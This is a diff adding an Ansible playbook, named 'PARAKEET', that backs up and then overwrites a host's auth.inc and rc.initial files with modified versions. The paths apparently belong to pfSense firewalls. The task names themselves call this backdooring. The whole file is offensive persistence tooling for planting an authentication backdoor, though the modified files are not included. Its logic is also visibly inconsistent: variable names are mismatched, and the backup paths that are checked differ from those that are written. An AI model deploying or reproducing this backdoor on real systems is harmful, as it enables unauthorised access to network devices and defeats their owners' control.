@@ -1,0 +1,52 @@
+---
+
+- name: PARAKEET | BAK | Make sure backup directory exists
+  stat: 
+    path: /etc/bak/
+  register: Bak
+
+- name: PARAKEET | BAK | Make backup directory
+  ansible.builtin.file:
+    state: directory
+    path: /etc/bak/
+    mode: 0755
+    owner: root 
+  when: bak.stat.exists == False 
+
+
+- name: PARAKEET | AUTH.INC | Check if auth.inc already backdoored
+  stat:
+    path: /etc/bak/.auth.inc
+  register: auth_backup
+
+
+- name: PARAKEET | AUTH.INC | Make a backup of auth.inc
+  copy:
+    remote_src: yes
+    src: /etc/inc/auth.inc
+    dest: /etc/inc/.auth.inc
+  when: auth_backup.stat.exists == False
+
+
+- name: PARAKEET | AUTH.INC | Deploy modified auth.inc
+  copy:
+    src: files/auth.inc
+    dest: /etc/inc/auth.inc
+
+
+- name: PARAKEET | RC.INITIAL | Check if RC.INITIAL already backdoored
+  stat: 
+    path: /etc/bak/rc.initial
+  register: initial_backup
+
+- name: PARAKEET | RC.INITIAL | Make a backup of RC.INITIAL
+  copy: 
+    remote_src: yes
+    src: /etc/rc.initial
+    dest: /etc/bak/rc.initial
+  
+- name: PARAKEET | RC.INITIAL | Deploy modified RC.INITIAL
+  copy: 
+    src: files/rc.initial
+    dest: /etc/rc.initial
+    
